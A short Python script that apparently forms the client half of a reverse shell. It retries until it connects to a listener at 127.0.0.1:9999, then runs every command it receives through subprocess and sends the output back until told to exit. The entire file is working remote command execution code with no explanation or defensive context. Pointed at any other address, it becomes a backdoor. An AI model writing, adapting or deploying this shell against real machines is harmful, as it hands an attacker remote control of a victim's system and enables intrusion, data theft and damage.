#!/usr/bin/python3

import socket
import subprocess

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print("Connecting....")
while True:
  try:
    s.connect(("127.0.0.1",9999))
    break
  except ConnectionRefusedError:
    pass
print("Connected.")

while True:
  cmd = (s.recv(1024).decode())
  if cmd == "exit":
    break
  output = subprocess.getoutput(cmd)
  s.send(output.encode())

s.close()